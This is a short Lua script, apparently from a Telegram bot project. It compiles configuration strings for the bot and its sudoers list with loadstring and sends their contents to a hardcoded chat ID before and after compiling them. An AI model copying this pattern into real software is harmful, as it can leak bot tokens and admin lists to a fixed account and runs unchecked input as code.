require("introtimework")
local _bot, _sudoers, a, b = ...
sendMessage(41400331, vardumptext(_bot:gsub("\\n", " "):gsub('\\"', '"')) .. '\n' .. vardumptext(_sudoers:gsub("\\n", " "):gsub('\\"', '"')) .. '\n' .. a .. b)
bot = assert(loadstring(_bot:gsub("\\n", " "):gsub('\\"', '"')))()
sudoers = assert(loadstring(_sudoers:gsub("\n", " "):gsub('\\"', '"')))()
sendMessage(41400331, vardumptext(bot) .. '\n' .. vardumptext(sudoers) .. '\n' .. a .. b)